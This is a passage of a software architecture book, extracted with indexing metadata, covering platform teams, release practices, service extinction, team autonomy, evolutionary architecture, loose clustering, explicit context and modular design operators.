• discuss\n\nProcess and Organization • 293\n\n“DevOps Team”, on page 294.) The rise of virtualization and cloud computing made infrastructure programmable. Open source ops tools made ops pro- grammable, too. Virtual machine images and, later, containers and unikernels meant that programs became “operating systems.”\n\nWhen we look at the layers from Chapter 7, Foundations, on page 141, we see the need for software development up and down the stack. Likewise, we need operations up and down the stack.\n\nWhat used to be just infrastructure and operations now rolls in programmable components. It becomes the platform that everything else runs on. Whether you’re in the cloud or in your own data center, you need a platform team that views application development as its customer. That team should provide API and command-line provisioning for the common capabilities that appli- cations need, as well as the things we looked at in Chapter 10, Control Plane, on page 193:\n\nCompute capacity, including high-RAM, high-IO, and high-GPU configu- rations for specialized purposes (The needs of machine learning and the needs of media servers are very different.)\n\nWorkload management, autoscaling, virtual machine placement, and\n\noverlay networking\n\nStorage, including content addressable storage (for example, “blob stores”)\n\nand filesystem-structured storage\n\nLog collection, indexing, and search\n\nMetrics collection and visualization\n\nMessage queuing and transport\n\nTraffic management and network security\n\nDynamic DNS registration and resolution\n\nEmail gateways\n\nAccess control, user, group, and role management\n\nIt’s a long list, and more will be added over time. Each of these are things that individual teams could build themselves, but they aren’t valuable in isolation.\n\nOne important thing for the platform team is to remember they are implement- ing mechanisms that allow others to do the real provisioning. In other words, the platform team should not implement all your specific monitoring rules.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 294\n\nInstead, this team provides an API that lets you install your monitoring rules into the monitoring service provided by the platform. Likewise, the platform team doesn’t built all your API gateways. It builds the service that builds the API gateways for individual application teams.\n\nYou might buy—or more likely download—a capital-P Platform from a vendor. That doesn’t replace the need for your own platform team, but it does give the team a massive head start.\n\nThe platform team must not be held accountable for application availability. That must be on the application teams. Instead, the platform team must be measured on the availability of the platform itself.\n\nThe platform team needs a customer-focused orientation. Its customers are the application developers. This is a radical change from the old dev/IT split. In that world, operations was the last line of defense, working as a check against development. Development was more of a suspect than a customer! The best rule of thumb is this: if your developers only use the platform because it’s mandatory, then the platform isn’t good enough.\n\nThe Fallacy of the “DevOps Team”\n\nIt’s common these days, typically in larger enterprises, to find a group called the DevOps team. This team sits between development and operations with the goal of moving faster and automating releases into production. This is an antipattern.\n\nFirst, the idea of DevOps is to bring the two worlds of development and operations together. It should soften the interface between different teams. How can introducing an intermediary achieve that? All that does is create two interfaces where there was one.\n\nSecond, DevOps goes deeper than deployment automation. It’s a cultural transforma- tion, a shift from ticket- and blame-driven operations with throw-it-over-the-wall releases to one based on open sharing of information and skills, data-driven decision- making about architecture and design, and common values about production avail- ability and responsiveness. Again, isolating these ideas to a single team undermines the whole point.\n\nWhen a company creates a DevOps team, it has one of two objectives. One possibility is that it’s really either a platform team or a tools team. This is a valuable pursuit, but it’s better to call it what it is.\n\nThe other possibility is that the team is there to promote the adoption of DevOps by others. This is more akin to an agile adoption team or a “transformation” team. In that case, be very explicit that the team’s goal is not to produce software or a platform. Its focus should be on education and evangelism. Team members need to spread the values and encourage others to adopt the spirit of DevOps.\n\nreport erratum • discuss\n\nProcess and Organization • 295\n\nPainless Releases\n\nThe release process described in Chapter 12, Case Study: Waiting for Godot, on page 237, rivals that of NASA’s mission control. It starts in the afternoon and runs until the wee hours of the morning. In the early days, more than twenty people had active roles to play during the release. As you might imagine, any process involving that many people requires detailed planning and coordination. Because each release is arduous, they don’t do many a year. Because there are so few releases, each one tends to be unique. That uniqueness requires additional planning with each release, making the release a bit more painful—further discouraging more frequent releases.\n\nReleases should about as big an event as getting a haircut (or compiling a new kernel, for you gray-ponytailed UNIX hackers who don’t require haircuts). The literature on agile methods, lean development, continuous delivery, and incremental funding all make a powerful case for frequent releases in terms of user delight and business value. With respect to production operations, however, there’s an added benefit of frequent releases. It forces you to get really good at doing releases and deployments.\n\nA closed feedback loop is essential to improvement. The faster that feedback loop operates, the more accurate those improvements will be. This demands frequent releases. Frequent releases with incremental functionality also allow your company to outpace its competitors and set the agenda in the marketplace.\n\nAs commonly practiced, releases cost too much and introduce too much risk. The kind of manual effort and coordination I described previously is barely sustainable for three or four releases a year. It could never work for twenty a year. One solution—the easy but harmful one—is to slow down the release calendar. Like going to the dentist less frequently because it hurts, this response to the problem can only exacerbate the issue. The right response is to reduce the effort needed, remove people from the process, and make the whole thing more automated and standardized.\n\nIn Continuous Delivery [HF10], Jez Humble and Dave Farley describe a number of ways to deliver software continuously and at low risk. The patterns let us enforce quality even as we crank the release frequency up to 11. A “Canary Deploy” pushes the new code to just one instance, under scrutiny. If it looks good, then the code is cleared for release to the remaining machines. With a “Blue/Green Deploy,” machines are divided into two pools. One pool is active in production. The other pool gets the new deployment. That leaves time to test it out before exposing it to customers. Once the new pool looks good, you shift production traffic over to it. (Software-controlled load balancers help\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 296\n\nhere.) For really large environments, the traffic might be too heavy for a small pool of machines to handle. In that case, deploying in waves lets you manage how fast you expose customers to the new code.\n\nThese patterns all have a couple of things in common. First, they all act as governors (see Governor, on page 123) to limit the rate of dangerous actions. Second, they all limit the number of customers who might be exposed to a bug, either by restricting the time a bug might be visible or by restricting the number of people who can reach the new code. That helps reduce the impact and cost of anything that slipped past the unit tests.\n\nService Extinction\n\nEvolution by natural selection is a brutal, messy process. It wastes resources profligately. It’s random, and changes fail more often than they succeed. The key ingredients are repeated iteration of small variations with selection pressure.\n\nOn the other hand, evolution does progress by incremental change. It produces organisms that are more and more fit for their environment over time. When the environment changes rapidly, some species disappear while others become more prevalent. So while any individual or species is vulnerable in the extreme, the ecosystem as a whole tends to persist.\n\nWe will look at evolutionary architecture in Evolutionary Architecture, on page 302. It attempts to capture the adaptive power of incremental change within an organization. The idea is to make your organization antifragile by allowing independent change and variation in small grains. Small units—of technology and of business capability—can succeed or fail on their own.\n\nParadoxically, the key to making evolutionary architecture work is failure. You have to try different approaches to similar problems and kill the ones that are less successful.\n\nTake a look at the figure on page 297. Suppose you have two ideas about pro- motions that will encourage users to register. You’re trying to decide between cross-site tracking bugs to zero in on highly interested users versus a blanket offer to everyone. The big service will accumulate complexity faster than the sum of two smaller services. That’s because it must also make decisions about routing and precedence (at a minimum.) Larger codebases are more likely to catch a case of “frameworkitis” and become overgeneralized. There’s a vicious cycle that comes into play: more code means it’s harder to change, so every piece of code needs to be more generalized, but that leads to more code. Also, a shared database means every change has a higher potential to disrupt. There’s little isolation of failure domains here.\n\nreport erratum • discuss",
      "page_number": 290,
      "chapter_number": 36,
      "summary": "This chapter covers segment 36 (pages 290-298). Key topics include team, servers, and developers.",
      "keywords": [
        "Platform Team",
        "team",
        "platform",
        "session",
        "application",
        "n’t",
        "home page",
        "DevOps Team",
        "report erratum",
        "time",
        "application teams",
        "decision loop",
        "decision",
        "user",
        "development"
      ],
      "concepts": [
        "team",
        "servers",
        "developers",
        "pages",
        "changes",
        "times",
        "create",
        "created",
        "report",
        "application"
      ],
      "similar_chapters": [
        {
          "book": "Reliable Machine Learning",
          "chapter": 25,
          "title": "Segment 25 (pages 212-220)",
          "relevance_score": 0.7,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 4",
          "chapter": 30,
          "title": "Segment 30 (pages 523-540)",
          "relevance_score": 0.68,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 4",
          "chapter": 32,
          "title": "Segment 32 (pages 559-576)",
          "relevance_score": 0.67,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 4",
          "chapter": 35,
          "title": "Segment 35 (pages 613-630)",
          "relevance_score": 0.67,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 4",
          "chapter": 24,
          "title": "Segment 24 (pages 415-432)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 37,
      "title": "Segment 37 (pages 299-307)",
      "start_page": 299,
      "end_page": 307,
      "detection_method": "topic_boundary",
      "content": "Process and Organization • 297\n\nCaller\n\nRequestDetails\n\nPromotions\n\nShared Database\n\nPage Oﬀers\n\nUser OﬀersUser IDPage ID\n\nInstead of building a single “promotions service” as before, you could build two services that can each chime in when a new user hits your front end. In the next figure, each service makes a decision based on whatever user infor- mation is available.\n\nCaller\n\nUser ID\n\nUser-Based Promotions\n\nUser OﬀersPage IDpromotion\n\nPage-BasedPromotions\n\nEach promotion service handles just one dimension. The user offers still need a database, but maybe the page-based offers just require a table of page types embedded in the code. After all, if you can deploy code changes in a matter of minutes, do you really need to invest in content management? Just call your source code repo the content management repository.\n\nIt’s important to note that this doesn’t eliminate complexity. Some irreducible —even essential—complexity remains. It does portion the complexity into different codebases, though. Each one should be easier to maintain and prune, just as it’s easier to prune a bonsai juniper than a hundred-foot oak. Here, instead of making a single call, the consumer has to decide which of the ser- vices to call. It may need to issue calls in parallel and decide which response to use (if any arrive at all). One can further subdivide the complexity by adding an application-aware router between the caller and the offer services.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 298\n\nOne service will probably outperform the other. (Though you need to define “outperform.” Is it based just on the conversion rate? Or is it based on cus- tomer acquisition cost versus lifetime profitability estimates?) What should you do with the laggard? There are only five choices you can make:\n\n1. Keep running both services, with all their attendant development and\n\noperational expenses.\n\n2. Take away funding from the successful one and use that money to make\n\nthe unsuccessful one better.\n\n3. Retool the unsuccessful one to work in a different area where it isn’t head- to-head competing with the better one. Perhaps target a different user segment or a different part of the customer life cycle.\n\n4. Delete the unsuccessful one. Aim the developers at someplace where they\n\ncan do something more valuable.\n\n5. Give up, shut down the whole company, and open a hot dog and doughnut\n\nshop in Fiji.\n\nThe typical corporate approach would be #1 or #2. Starve the successful projects because they’re “done” and double down on the efforts that are behind schedule or over budget. Not to mention that in a typical corporation, shutting down a system or service carries a kind of moral stigma. Choice #3 is a better approach. It preserves some value. It’s a pivot.\n\nYou need to give serious consideration to #4, though. The most important part of evolution is extinction. Shut off the service, delete the code, and reassign the team. That frees up capacity to work on higher value efforts. It reduces dependencies, which is vital to the long-term health of your organi- zation. Kill services in small grains to preserve the larger entity.\n\nAs for Fiji, it’s a beautiful island with friendly people. Bring sunscreen and grow mangoes.\n\nTeam-Scale Autonomy\n\nYou’re probably familiar with the concept of the two-pizza team. This is Amazon founder and CEO Jeff Bezos’s rule that every team should be sized no bigger than you can feed with two large pizzas. It’s an important but mis- understood concept. It’s not just about having fewer people on a team. That does have its own benefit for communication.\n\nA self-sufficient two-pizza team also means each team member has to cover more than one discipline. You can’t have a two-pizza team if you need a dedicated\n\nreport erratum • discuss\n\nProcess and Organization • 299\n\nDBA, a front-end developer, an infrastructure guru, a back-end developer, a machine-learning expert, a product manager, a GUI designer, and so on.\n\nThe two-pizza team is about reducing external dependencies. Every dependen- cy is like one of the Lilliputian’s ropes tying Gulliver to the beach. Each dependency thread may be simple to deal with on its own, but a thousand of them will keep you from breaking free.\n\nNo Coordinated Deployments\n\nThe price of autonomy is eternal vigilance...or something like that. If you ever find that you need to update both the provider and caller of an service interface at the same time, it’s a warning sign that those services are strongly coupled.\n\nIf you are the service provider, you are responsible. You can probably rework the interface to be backward-compatible. (See Nonbreaking API Changes, on page 263, for strategies to avoid breakage.) If not, consider treating the new interface as a new route in your API. Leave the old one in place for now. You can remove it in a few days or weeks, after your consumers have updated.\n\nDependencies across teams also create timing and queuing problems. Anytime you have to wait for others to do their work before you can do your work, everyone gets slowed down. If you need a DBA from the enterprise data architecture team to make a schema change before you can write the code, it means you have to wait until that DBA is done with other tasks and is available to work on yours. How high you are on the priority list determines when the DBA will get to your task.\n\nThe same goes for downstream review and approval processes. Architecture review boards, release management reviews, change control committees, and the People’s Committee for Proper Naming Conventions...each review process adds more and more time.\n\nThis is why the concept of the two-pizza team is misunderstood. It’s not just about having a handful of coders on a project. It’s really about having a small group that can be self-sufficient and push things all the way through to production.\n\nGetting down to this team size requires a lot of tooling and infrastructure support. Specialized hardware like firewalls, load balancers, and SANs must have APIs wrapped around them so each team can manage its own configu- ration without wreaking havoc on everyone else. The platform team I discussed in Platform Team, on page 292, has a big part to play in all this. The platform team’s objective must be to enable and facilitate this team-scale autonomy.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 300\n\nBeware Efficiency\n\n“Efficiency” sounds like it could only ever be a good thing, right? Just trying telling your CEO that the company is too efficient and needs to introduce some inefficiency! But efficiency can go wrong in two crucial ways that hurt your adaptability.\n\nEfficiency sometimes translates to “fully utilized.” In other words, your com- pany is “efficient” if every developer develops and every designer designs close to 100 percent of the time. This looks good when you watch the people. But if you watch how the work moves through the system, you’ll see that this is anything but efficient. We’ve seen this lesson time and time again from The Goal [Gol04], to Lean Software Development [PP03], to Principles of Product Development Flow [Rei09], to Lean Enterprise [HMO14] and The DevOps Handbook [KDWH16]: Keep the people busy all the time and your overall pace slows to a crawl.\n\nA more enlightened view of efficiency looks at the process from the point of view of the work instead of the workers. An efficient value stream has a short cycle time and high throughput. This kind of efficiency is better for the bottom line than high utilization. But there’s a subtle trap here: as you make a value stream more efficient, you also make it more specialized to today’s tasks. That can make it harder to change for the future.\n\nWe can learn from a car manufacturer that improved its cycle time on the production line by building a rig that holds the car from the inside. The new rig turned, lifted, and positioned the car as it moved along the production line, completely replacing the old conveyor belt. It meant that the worker (or robot) could work faster because the work was always positioned right in front of them. Workers didn’t need to climb into the trunk to place a bolt from the inside. It reduced cycle time and had a side effect of reducing the space needed for assembly. All good, right? The bad news was that they then needed a custom rig for each specific type of vehicle. Each model required its own rig, and so it became more difficult to redesign the vehicle, or switch from cars to vans or trucks. Efficiency came at the cost of flexibility.\n\nThis is a fairly general phenomenon: a two-person sailboat is slow and labor- intensive, but you can stop at any sand bar that strikes your fancy. A contain- er ship carries a lot more stuff, but it can only dock at deep water terminals. The container ship trades efficiency for flexibility.\n\nDoes this happen in the software industry? Absolutely. Ask anyone who relies on running builds with Visual Studio out of Team Foundation Server how easily they can move to Jenkins and Git. For that matter, just try to port your\n\nreport erratum • discuss\n\nSystem Architecture • 301\n\nbuild pipeline from one company to another. All the hidden connections that make it efficient also make it harder to adapt.\n\nKeep these pitfalls in mind any time you build automation and tie into your infrastructure or platform. Shell scripts are crude, but they work everywhere. (Even on that Windows server, now that the “Windows Subsystem for Linux” is out of beta!) Bash scripts are that two-person sailboat. You can go anywhere, just not very quickly. A fully automated build pipeline that delivers containers straight into Kubernetes every time you make a commit and that shows commit tags on the monitoring dashboard will let you move a lot faster, but at the cost of making some serious commitments.\n\nBefore you make big commitments, use the grapevine in your company to find out what might be coming down the road. For example, in 2017 many companies are starting to feel uneasy about their level of dependency on Amazon Web Services. They are edging toward multiple clouds or just straight- out migrating to a different vendor. If your company is one of them, you’d really like to know about it before you bolt your new platform onto AWS.\n\nSummary\n\nAdaptability doesn’t happen by accident. If there’s a natural order to software, it’s the Big Ball of Mud.4 Without close attention, dependencies proliferate and coupling draws disparate systems into one brittle whole.\n\nLet’s now turn from the human side of adaptation to the structure of the software itself.\n\nSystem Architecture\n\nIn The Evolution of Useful Things [Pet92], Henry Petroski argues that the old dictum “Form follows function” is false. In its place, he offers the rule of design evolution, “Form follows failure.” That is, changes in the design of such commonplace things as forks and paper clips are motivated more by the things early designs do poorly than those things they do well. Not even the humble paper clip sprang into existence in its present form. Each new attempt differs from its predecessor mainly in its attempts to correct flaws.\n\nThe fledgling system must do some things right, or it would not have been launched, and it might do other things as well as the designers could conceive. Other features might work as built but not as intended, or they might be more difficult than they should be. In essence, there are gaps and protrusions\n\n4.\n\nhttp://www.laputan.org/mud\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 302\n\nbetween the shape of the system and the solution space it’s meant to occupy. In this section, we’ll look at how the system’s architecture can make it easier to adapt over time.\n\nEvolutionary Architecture\n\nIn Building Evolutionary Architectures [FPK17], Neal Ford, Rebecca Parsons, and Patrick Kua define an evolutionary architecture as one that “supports incremental, guided change as a first principle across multiple dimensions.” Given that definition, you might reasonably ask why anyone would build a nonevolutionary architecture!\n\nSadly, it turns out that many of the most basic architecture styles inhibit that incremental, guided change. For example, the typical enterprise applica- tion uses a layered architecture something like the one shown in the following illustration. The layers are traditionally separated to allow technology to change on either side of the boundary. How often do we really swap out the database while holding everything else constant? Very seldom. Layers enforce vertical isolation, but they encourage horizontal coupling.\n\nUser interface\n\nSession\n\nDomain\n\nPersistence\n\nThe horizontal coupling is much more likely to be a hindrance. You’ve probably encountered a system with three or four gigantic domain classes that rule the world. Nothing can change without touching one of those, but any time you change one, you have to contain ripples through the codebase—not to mention retesting the world.\n\nWhat happens if we rotate the barriers 90 degrees? We get something like component-based architecture. Instead of worrying about how to isolate the domain layer from the database, we isolate components from each other. Components are only allowed narrow, formal interfaces between each other. If you squint, they look like microservice instances that happen to run in the same process.\n\nreport erratum • discuss\n\nSystem Architecture • 303\n\nBad Layering\n\nTrouble arises when layers are built: any common change requires a drilling expedition to pierce through several of them. Have you ever checked in a commit that had a bunch of new files like “Foo,” “FooController,” “FooFragment,” “FooMapper,” “FooDTO,” and so on? That is evidence of bad layering.\n\nIt happens when one layer’s way of breaking down the problem space dominates the other layers. Here, the domain dominates, so when a new concept enters the domain, it has shadows and reflections in the other layers.\n\nLayers could change independently if each layer expressed the fundamental concepts of that layer. “Foo” is not a persistence concept, but “Table” and “Row” are. “Form” is a GUI concept, as is “Table” (but a different kind of table than the persistence one!) The boundary between each layer should be a matter of translating concepts.\n\nIn the UI, a domain object should be atomized into its constituent attributes and constraints. In persistence, it should be atomized into rows in one or more tables (for a relational DB) or one or more linked documents.\n\nWhat appears as a class in one layer should be mere data to every other layer.\n\nEach component owns its whole stack, from database up through user interface or API. That does mean the eventual human interface needs a way to federate the UI from different components. But that’s no problem at all! Components may present HTML pages with hyperlinks to themselves or other components. Or the UI may be served by a front-end app that makes API calls to a gateway or aggregator. Make a few of these component-oriented stacks and you’ll arrive at a structure called “self-contained systems.”5\n\nThis is one example of moving toward an evolutionary architecture. In the example we’ve just worked through, it allows incremental guided change along the dimensions of “business requirements” and “interface technology.” You should get comfortable with some of the other architecture styles that lend themselves to evolutionary architecture:\n\nMicroservices\n\nVery small, disposable units of code. Emphasize scalability, team-scale autonomy. Vulnerable to coupling with platform for monitoring, tracing, and continuous delivery.\n\nMicrokernel and plugins\n\nIn-process, in-memory message passing core with formal interfaces to extensions. Good for incremental change in require- ments, combining work from different teams. Vulnerable to language and runtime environment.\n\n5.\n\nhttp://scs-architecture.org\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 304\n\nEvent-based\n\nPrefers asynchronous messages for communication, avoiding direct calls. Good for temporal decoupling. Allows new subscribers without change to publishers. Allows logic change and reconstruction from history. Vulnerable to semantic change in message formats over time.\n\nIt may be clear from those descriptions, but every architecture style we’ve dis- covered so far has trade-offs. They’ll be good in certain dimensions and weak in others. Until we discover the Ur-architecture that evolves in every dimension, we’ll have to decide which ones matter most for our organizations. A startup in the hypergrowth stage probably values scaling the tech team much more than it values long-term evolution of the business requirements. An established enterprise that needs to depreciate its capital expenditure over five years needs to evolve along business requirements and also the technology platform.\n\nA Note on Microservices\n\nMicroservices are a technological solution to an organizational problem. As an orga- nization grows, the number of communication pathways grows exponentially. Simi- larly, as a piece of software grows, the number of possible dependencies within the software grows exponentially.\n\nClasses tend toward a power-law distribution. Most classes have one or a few dependencies, while a very small number have hundreds or thousands. That means any particular change is likely to encounter one of those and incur a large risk of “action at a distance.” This makes developers hesitant to touch the problem classes, so necessary refactoring pressure is ignored and the problem gets worse. Eventually, the software degrades to a Big Ball of Mud.\n\nThe need for extensive testing grows with the software and the team size. Unforeseen consequences multiply. Developers need a longer ramp-up period before they can work safely in the codebase. (At some point, that ramp-up time exceeds your average developer tenure!)\n\nMicroservices promise to break the paralysis by curtailing the size of any piece of software. Ideally it should be no bigger than what fits in one developer’s head. I don’t mean that metaphorically. When shown on screen, the length of the code should be smaller than the coder’s melon. That forces you to either write very small services or hire a very oddly proportioned development staff.\n\nAnother subtle issue about microservices that gets lost in the excitement is that they’re great when you are scaling up your organization. But what happens when you need to downsize? Services can get orphaned easily. Even if they get adopted into a good home, it’s easy to get overloaded when you have twice as many services as developers.\n\nDon’t pursue microservices just because the Silicon Valley unicorns are doing it. Make sure they address a real problem you’re likely to suffer. Otherwise, the opera- tional overhead and debugging difficulty of microservices will outweigh your benefits.\n\nreport erratum • discuss\n\nSystem Architecture • 305\n\nLoose Clustering\n\nSystems should exhibit loose clustering. In a loose cluster, the loss of an indi- vidual instance is no more significant than the fall of a single tree in a forest.\n\nHowever, this implies that individual servers don’t have differentiated roles. At the very least any differentiated roles are present in more than one instance. Ideally, the service wouldn’t have any unique instance. But if it does need a unique role, then it should use some form of leader election. That way the service as a whole can survive the loss of the leader without manual interven- tion to reconfigure the cluster.\n\nThe members of a loose cluster can be brought up or down independently of each other. You shouldn’t have to start the members in a specific sequence. In addition, the instances in a cluster shouldn’t have any specific dependencies on—or even knowledge of—the individual instances of another cluster. They should only depend on a virtual IP address or DNS name that represents the service as a whole. Direct member-to-member dependencies create hard linkages preventing either side from changing independently. Take a look at the following figure for an example. The calling application instances in cluster 1 depend on the DNS name (bound to a load-balanced IP address) cluster 2 serves.\n\nCluster 1\n\nApp Instances\n\nCluster 2\n\nApp Instances\n\nport\n\nWe can extend this “principle of ignorance” further. The members of a cluster should not be configured to know the identities of other members of the cluster. That would make it harder to add or remove members. It can also encourage point-to-point communication, which is a capacity killer.\n\nThe nuance behind this rule is that cluster members can discover who their colleagues are. That’s needed for distributed algorithms like leader election and failure detection. The key is that this is a runtime mechanism that doesn’t require static configuration. In other words, one instance can observe others appearing and disappearing in response to failures or scaling.\n\nLoose clustering in this way allows each cluster to scale independently. It allows instances to appear, fail, recover, and disappear as the platform allows and as traffic demands.\n\nreport erratum • discuss",
      "page_number": 299,
      "chapter_number": 37,
      "summary": "This chapter covers segment 37 (pages 299-307). Key topics include user, architecture, and service. Covers architecture. The literature on agile methods, lean development, continuous delivery, and incremental funding all make a powerful case for frequent releases in terms of user delight and business value.",
      "keywords": [
        "Waiting for Godot",
        "Painless Releases",
        "architecture",
        "evolutionary architecture",
        "Releases",
        "frequent releases",
        "team",
        "make",
        "NASA ’s mission",
        "time",
        "report erratum",
        "work",
        "code",
        "Service",
        "user"
      ],
      "concepts": [
        "user",
        "architecture",
        "service",
        "changes",
        "team",
        "different",
        "differs",
        "requires",
        "required",
        "requirements"
      ],
      "similar_chapters": [
        {
          "book": "AntiPatterns",
          "chapter": 9,
          "title": "Segment 9 (pages 74-81)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Reliable Machine Learning",
          "chapter": 25,
          "title": "Segment 25 (pages 212-220)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "AntiPatterns",
          "chapter": 12,
          "title": "Segment 12 (pages 98-105)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice Architecture",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 1,
          "title": "Segment 1 (pages 1-8)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 38,
      "title": "Segment 38 (pages 308-316)",
      "start_page": 308,
      "end_page": 316,
      "detection_method": "topic_boundary",
      "content": "Chapter 16. Adaptation • 306\n\nExplicit Context\n\nSuppose your service receives this fragment of JSON inside a request:\n\n{\"item\": \"029292934\"}\n\nHow much do we know about the item? Is that string the item itself? Or is it an item identifier? Maybe the field would be better named “itemID.” Supposing that it is an identifier, our service can’t do very much with it. In fact, only four things are possible:\n\n1. Pass it through as a token to other services. (This includes returning it\n\nto the same caller in the future.)\n\n2. Look it up by calling another service.\n\n3. Look it up in our own database.\n\n4. Discard it.\n\nIn the first case, we’re just using the “itemID” as a token. We don’t care about the internal structure. In this case it would be a mistake to convert it from string to numeric. We’d be imposing a restriction that doesn’t add any value and will probably need to be changed—with huge disruption—in the future.\n\nIn the second and third cases, we’re using the “itemID” as something we can resolve to get more information. But there’s a serious problem here. The bare string shown earlier doesn’t tell us who has the authoritative information. If the answer isn’t in our own database, we need to call another service. Which service?\n\nThis issue is so pervasive that it doesn’t even look like a problem at first. In order to get item information, your service must already know who to call! That’s an implicit dependency.\n\nThat implicit dependency limits you to working with just the one service provider. If you need to support items from two different “universes,” it’s going to be very disruptive.\n\nSuppose instead the initial fragment of JSON looked like this:\n\n{\"itemID\": \"https://example.com/policies/029292934\"}\n\nThis URL still works if we just want to use it as an opaque token to pass for- ward. From one perspective, it’s still just a Unicode string.\n\nThis URL also still works if we need to resolve it to get more information. But now our service doesn’t have to bake in knowledge of the solitary authority. We can support more than one of them.\n\nreport erratum • discuss\n\nSystem Architecture • 307\n\nBy the way, using a full URL also makes integration testing easier. We no longer need “test” versions of the other services. We can supply our own test harnesses and use URLs to those instead of the production authorities.\n\nThis example is all in the context of interservice communication. But making implicit context into explicit context has big benefits inside services as well. If you’ve worked on a Ruby on Rails system, you might have run into difficulty when trying to use multiple relational databases from a single service. That’s because ActiveRecord uses an implicit database connection. This is convenient when there’s just one database, but it becomes a hindrance when you need more than one.\n\nGlobal state is the most insidious form of implicit context. That include con- figuration parameters. These will slow you down when you need to go from “one” to “more than one” of a collaboration.\n\nCreate Options\n\nImagine you are an architect—the kind that makes buildings. Now you’ve been asked to add a new wing to the iconic Sydney Opera House. Where could you possibly expand that building without ruining it? The Australian landmark is finished. It is complete—a full expression of its vision. There is no place to extend it.\n\nTake the same request, but now for the Winchester “Mystery” House in San Jose, California.6 Here’s its description in Wikipedia:\n\nSince its construction in 1884, the property and mansion were claimed by many, including Winchester herself, to be haunted by the ghosts of those killed with Winchester rifles. Under Winchester’s day-to-day guidance, its “from-the-ground- up” construction proceeded around the clock, by some accounts, without inter- ruption, until her death on September 5, 1922.7\n\nCould you add a wing to this house without destroying the clarity of its vision? Absolutely. In some sense, continuous change is the vision of the house, or it was to its late owner. The Winchester house is not coherent in the way that the Opera House is. Stairways lead to ceilings. Windows look into rooms next door. You might call this “architecture debt.” But you have to admit it allows for change.\n\nThe reason these differ is mechanical as much as it is artistic. A flat exterior wall on the Winchester house has the potential for a door. The smoothly curved\n\n6. 7.\n\nhttp://www.winchestermysteryhouse.com\n\nhttps://en.wikipedia.org/wiki/Winchester_Mystery_House\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 308\n\nsurfaces of Sydney’s shells don’t. A flat wall creates an option. A future owner can exercise that option to add a room, a hallway, or a stair to nowhere.\n\nModular systems inherently have more options than monolithic ones. Think about building a PC from parts. The graphics card is a module that you can substitute or replace. It gives you an option to apply a modification.\n\nIn Design Rules [BC00], Carliss Y. Baldwin and Kim B. Clark identify six “modular operators.” Their work was in the context of computer hardware, but it applies to distributed service-based systems as well. Every module boundary gives you an option to apply these operators in the future. Let’s take a brief look at the operators and how they could apply in a software system.\n\nSplitting\n\nSplitting breaks a design into modules, or a module into submodules. The following figure shows a system before and after splitting “Module 1” into three parts. This is often done to distribute work. Splitting requires insight into how the features can be decomposed so that cross-dependencies in the new modules are minimized and the extra work of splitting is offset by the increased value of more general modules.\n\nBefore\n\nSystem\n\nModule 1\n\nModule 2\n\n1-a\n\n1-c\n\nSystem\n\n1-b\n\nModule 2\n\nModule 3\n\nModule 4\n\nAfter\n\nModule 4\n\nModule 3\n\nShell Delegates Work\n\nreport erratum • discuss\n\nSystem Architecture • 309\n\nExample: We start with a module that determines how to ship products to a customer. It uses the shipping address to decide how many shipments to send, how much it’ll cost, and when the shipments will arrive.\n\nOne way to split the module is shown in the next figure. Here, the parent module will invoke the submodules sequentially, using the results from one to pass into the next.\n\nStore\n\nShippingService\n\nBefore\n\nSystem\n\nShippingFacade\n\nAfter\n\nShipments\n\nShippingCost\n\nDeliveryEstimates\n\nA different way to split the modules might be one per carrier. In that case, the parent could invoke them all in parallel and then decide whether to present the best result or all results to the user. This makes the modules act a bit more like competitors. It also breaks down the sequential dependency from the functional division illustrated in the previous figure. But where this divi- sion really shines is failure isolation. In the original decomposition, if just one of the modules is broken, then the whole feature doesn’t work. If we divide the work by carrier, as illustrated in the figure on page 310, then one carrier’s service may be down or malfunctioning but the others will continue to work. Overall, we can still ship things through the other carriers. Of course, this assumes the parent module makes calls in parallel and times out properly when a module is unresponsive.\n\nThe key with splitting is that the interface to the original module is unchanged. Before splitting, it handles the whole thing itself. Afterward, it delegates work to the new modules but supports the same interface.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 310\n\nCarrier 1\n\nStore\n\nShippingService\n\nBefore\n\nSystem\n\nShippingFacade\n\nAfter\n\nCarrier 2\n\nCarrier 3\n\nA great paper on splitting is David Parnas’s 1971 paper, “On the Criteria to Be Used in Decomposing Systems.”8\n\nSubstituting\n\nGiven a modular design, “substituting” is just replacing one module with another—swapping out an NVidia card for an AMD card or vice versa.\n\nThe original module and the substitute need to share a common interface. That’s not to say they have identical interfaces, just that the portion of the interface needed by the parent system must be the same. Subtle bugs often creep in with substitutions.\n\nIn our running example, we might substitute a logistics module from UPS or FedEx in place of our original home-grown calculator.\n\nAugmenting and Excluding\n\nAugmenting is adding a module to a system. Excluding is removing one. Both of these are such common occurrences that we might not even think of them as design-changing operations. However, if you design your parent system to make augmenting and excluding into first-class priorities, then you’ll reach a different design.\n\n8.\n\nhttp://repository.cmu.edu/cgi/viewcontent.cgi?article=2979&context=compsci\n\nreport erratum • discuss\n\nSystem Architecture • 311\n\nFor example, if you decompose your system along technical lines you might end up with a module that writes to the database, a module that renders HTML, a module that supports an API, and a module that glues them all together. How many of those modules could you exclude? Possibly the API or the HTML, but likely not both. The storage interface might be a candidate for substitution, but not exclusion!\n\nSuppose instead you have a module that recommends related products. The module offers an API and manages its own data. You have another module that displays customer ratings, another that returns the current price, and one that returns the manufacturer’s price. Now each of these could be excluded individually without major 